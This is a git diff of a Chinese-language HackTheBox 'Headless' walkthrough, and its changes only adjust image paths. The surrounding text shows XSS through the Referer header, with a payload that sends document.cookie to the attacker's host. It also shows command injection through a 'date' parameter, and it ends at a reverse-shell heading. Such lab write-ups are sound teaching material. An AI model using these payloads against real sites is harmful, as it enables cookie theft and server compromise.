@@ -19,7 +19,7 @@ xxx
 
 ### Attack Path Overview
 
-![attack-path](./AttackPath/HTB-Headless.png){ width='450' }
+![attack-path](./../attackpath/HTB-Headless.png){ width='450' }
 
 
 ## External Recon - nmap
@@ -44,7 +44,7 @@ PORT     STATE SERVICE VERSION
 
 访问后可发现是个网页。
 
-![HTB-Headless-port5000](./evidence-img/HTB-Headless-port5000.png)
+![HTB-Headless-port5000](./../evidence-img/HTB-Headless-port5000.png)
 
 - robots.txt：无
 - .git/config：无
@@ -60,48 +60,48 @@ PORT     STATE SERVICE VERSION
 
 开启burp后再次访问网页，用burp拦截请求后右键选择`Response to this reuest`更改响应，减少其倒数时间，看看倒数结束后有什么事情发生。
 
-![HTB-Headless-intercept](./evidence-img/HTB-Headless-intercept.png)
+![HTB-Headless-intercept](./../evidence-img/HTB-Headless-intercept.png)
 
 
 将响应中的选中部分改为`5 * 1000`（即5秒）：
 
-![HTB-Headless-change_rep](./evidence-img/HTB-Headless-change_rep.png)
+![HTB-Headless-change_rep](./../evidence-img/HTB-Headless-change_rep.png)
 
 转发请求后网页显示倒数5秒：
 
-![HTB-Headless-change_rep2](./evidence-img/HTB-Headless-change_rep2.png)
+![HTB-Headless-change_rep2](./../evidence-img/HTB-Headless-change_rep2.png)
 
 倒数结束，无事发生：
 
-![HTB-Headless-countdown_completed](./evidence-img/HTB-Headless-countdown_completed.png)
+![HTB-Headless-countdown_completed](./../evidence-img/HTB-Headless-countdown_completed.png)
 
 #### 表单XSS获取Cookie
 
 点击`For questions`按钮跳转到`http://10.10.11.8:5000/support`。尝试XSS，在表单中填入`<script>alert(0)</script>`后发送，网页响应一个WAF警告页面。
 
-![HTB-Headless-WAF](./evidence-img/HTB-Headless-WAF.png)
+![HTB-Headless-WAF](./../evidence-img/HTB-Headless-WAF.png)
 
 **注意到网页中显示了我们的请求头信息。** 同时，观察多次请求可以发现Cookie值是固定不变的，且变量名为`is_admin`，所以怀疑可以获取admin的cookie然后访问之前显示“Unauthorized”的`/dashboard`。
 
 所以可以先测试一下请求头的XSS注入。  
 burp拦截请求，随便改一个网页中有显示的请求头（此处修改Referer）为`<script>alert(0)</script>`。
 
-![HTB-Headless-testXSS_Burp](./evidence-img/HTB-Headless-testXSS_Burp.png){ width='800' }
+![HTB-Headless-testXSS_Burp](./../evidence-img/HTB-Headless-testXSS_Burp.png){ width='800' }
 
 发送后弹出alert窗口，证明有XSS漏洞。
 
-![HTB-Headless-PoC_XSS](./evidence-img/HTB-Headless-PoC_XSS.png)
+![HTB-Headless-PoC_XSS](./../evidence-img/HTB-Headless-PoC_XSS.png)
 
 另外可以查看网页源码发现HTML确实被修改。
 
-![HTB-Headless-PoC_XSS2](./evidence-img/HTB-Headless-PoC_XSS2.png){ width='800' }
+![HTB-Headless-PoC_XSS2](./../evidence-img/HTB-Headless-PoC_XSS2.png){ width='800' }
 
 
 接下来尝试获取Cookie。  
 kali终端开启http服务。burp重放一下之前的请求，Referer头使用payload：`<img src=x onerror=fetch('http://10.10.14.8/?c='+document.cookie);>`——让WAF的警告界面加载不可用图片，触发`onerror`使其访问kali主机，并在URL中带上`document.cookie`参数——我们就可以在kali终端得知Cookie。  
 可以发现admin的Cookie为：`ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`。
 
-![HTB-Headless-document_cookie](./evidence-img/HTB-Headless-document_cookie.png){ width='800' }
+![HTB-Headless-document_cookie](./../evidence-img/HTB-Headless-document_cookie.png){ width='800' }
 
 
 ## Initial Access
@@ -110,25 +110,25 @@ kali终端开启http服务。burp重放一下之前的请求，Referer头使用p
 
 再次访问`http://10.10.11.8:5000/dashboard`并拦截请求，可以发现Cookie值目前还是我们之前观察到的固定值。将这个Cookie值改为上面说的`ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
 
-![HTB-Headless-dashboard](./evidence-img/HTB-Headless-dashboard.png){ width='600' }
+![HTB-Headless-dashboard](./../evidence-img/HTB-Headless-dashboard.png){ width='600' }
 
 转发请求后成功访问`/dashboard`页面，是一个生成报告的网页。点击`Generate Report`可以发现请求中发送了`date`参数。很有可能可以执行注入。
 
-![HTB-Headless-dashboard2](./evidence-img/HTB-Headless-dashboard2.png){ width='600' }
+![HTB-Headless-dashboard2](./../evidence-img/HTB-Headless-dashboard2.png){ width='600' }
 
 先看看正常情况下的网页响应：
 
-![HTB-Headless-dashboard3](./evidence-img/HTB-Headless-dashboard3.png){ width='600' }
+![HTB-Headless-dashboard3](./../evidence-img/HTB-Headless-dashboard3.png){ width='600' }
 
 ### 参数污染PoC
 
 接下来尝试一下注入。首先怀疑后台处理是命令行/bash脚本之类的（由于是linux），于是用分号截断，然后payload加上`id`看看响应：
 
-![HTB-Headless-dashboard-poc](./evidence-img/HTB-Headless-dashboard-poc.png){ width='600' }
+![HTB-Headless-dashboard-poc](./../evidence-img/HTB-Headless-dashboard-poc.png){ width='600' }
 
 成功回显命令`id`的结果（当前为dvir用户），说明`date`参数存在注入。
 
-![HTB-Headless-dashboard-poc2](./evidence-img/HTB-Headless-dashboard-poc2.png){ width='600' }
+![HTB-Headless-dashboard-poc2](./../evidence-img/HTB-Headless-dashboard-poc2.png){ width='600' }
 
 ### 反弹shell
 
